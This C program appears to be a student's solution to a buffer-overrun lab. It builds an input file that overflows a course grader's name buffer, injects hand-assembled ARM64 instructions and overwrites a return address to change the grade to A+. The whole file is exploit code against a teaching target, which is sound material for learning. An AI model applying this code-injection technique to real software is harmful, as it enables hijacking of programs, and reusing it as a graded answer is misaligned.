/* Produces a file called dataAplus with the student name, a nullbyte,
   some padding, some instructions that print an 'A' to stdout,
   some instructions that set the grade variable equal to
   the character +, and an instruction that branches back to
   the second to last printf call in the grader executable. The end
   of the dataA file also contains a return address that points to
   where our injected instructions live in the BSS. */

#include <stdio.h>
#include "miniassembler.h"

/* Takes in no arguments, and returns 0.
Prints a buffer overun string to the file dataAPlus that causes the
grader to give a grade A+ to the name Cole Amin */
int main()
{
    FILE *psFile;
    int i;
    /* Address of our code to print A+ as our grade */
    unsigned long ulInjectedCodeAddress = 0x420068;
    /* Stores the integer repersentation of the current instruction we
    want to execute in our code */
    unsigned int curInstruction;

    psFile = fopen("dataAplus", "w");

    /* Name */
    fprintf(psFile, "%s", "Cole Amin");
    /* Nullbyte at the end of the name */
    putc(0, psFile);

    /* Nullbytes for padding */
    for (i = 0; i < 2; i++)
    {
        putc(0, psFile);
    }

    /* 'A' portion of the A+ we print before branching */
    putc(65, psFile);
    /* Null byte for end of the 'A' string */
    putc(0, psFile);

    /* Nullbytes for padding */
    for (i = 0; i < 2; i++)
    {
        putc(0, psFile);
    }
    /* adr x30 to instruction after the code that prints 'A' to stdout*/
    curInstruction = MiniAssembler_adr(30, 0x420074, 0x420068);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* adr x0 to the address of our string "A" in the BSS */
    curInstruction = MiniAssembler_adr(0, 0x420064, 0x42006c);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* branch to function puts() */
    curInstruction = MiniAssembler_b(0x400690, 0x420070);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* mov w0, '+' */
    curInstruction = MiniAssembler_mov(0, 0x2b);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* adr x1 grade */
    curInstruction = MiniAssembler_adr(1, 0x420044, 0x420078);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* strb w0, x1 */
    curInstruction = MiniAssembler_strb(0, 1);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* branch back to the second to last printf in main function of
    grader */
    curInstruction = MiniAssembler_b(0x40089c, 0x420080);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* Filler nullbytes */
    for (i = 0; i < 4; i++)
    {
        putc(0, psFile);
    }

    /* Address for our grade overwrite code, which overwrites the
       return address of getName() */
    (void)fwrite(&ulInjectedCodeAddress, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}